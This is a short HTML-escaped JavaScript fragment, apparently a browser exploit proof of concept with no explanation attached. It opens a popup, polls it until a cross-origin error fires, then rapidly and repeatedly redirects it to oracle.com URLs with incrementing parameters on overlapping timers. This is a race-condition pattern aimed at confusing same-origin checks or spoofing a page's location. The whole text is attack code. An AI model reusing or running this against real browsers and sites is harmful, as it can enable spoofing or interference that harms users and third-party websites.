        function next()
        {
                w.location.replace(&#39;http://www.oracle.com/index.html?&#39;+n);n++;
                setTimeout(&#34;next();&#34;,15);
                setTimeout(&#34;next();&#34;,25);
        }
        function f()
        {
                w=window.open(&#34;content.html&#34;,&#34;_blank&#34;,&#34;width=500 height=500&#34;);
                i=setInterval(&#34;try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}&#34;,5);
        }
    
